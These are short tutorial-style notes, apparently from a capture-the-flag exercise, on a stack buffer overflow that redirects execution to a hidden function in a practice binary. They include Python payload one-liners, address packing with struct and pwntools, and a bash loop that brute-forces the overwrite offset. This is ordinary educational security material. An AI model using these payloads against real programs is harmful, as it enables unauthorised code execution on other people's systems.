1. using `strings` on binary
2. using `readelf -s program` to find functions (secret functions) with their memory location
3. Segmentation fault(core dumped) means you overtook the current memory assigned for a variable 
4. `dmesg | tail` will show what happened  when a segment failed ( aka finding if you succesfully overwrote the function )
5. `python -c "print 'A'*50" | ./program` inserting bytes to overwrite the current memory then repeating step 4 to see if we ovewrote the specific place
6. Find the threashold to finally overwrite the instruction pointer
7. Copy the secret function memory spot and encode it with python:

```
import struct
struct.pack('<I',0x080808)
```
or pwntools 
```
import pwn
pwn.p32(0x08080808)
or
pwn.p64(0x02020202)
```

8. Supply the function using python again using `python -c "print 'A'*50 + ';\x85\x04\x08'" | ./program` where `50` is changed to the correct number of bytes

---

###
Using Hopper we can determine where the function starts to overwrite it 

and also we can use this bash script to enumerate the correct spot to overwrite the memory 
`for i in {20..45}; do echo $i; python -c "print('A'*$i+'\xcb\x85\x04\x08')" | ./smash-the-stack ; done`

where the 20..45 is the range of offset we are searching for 


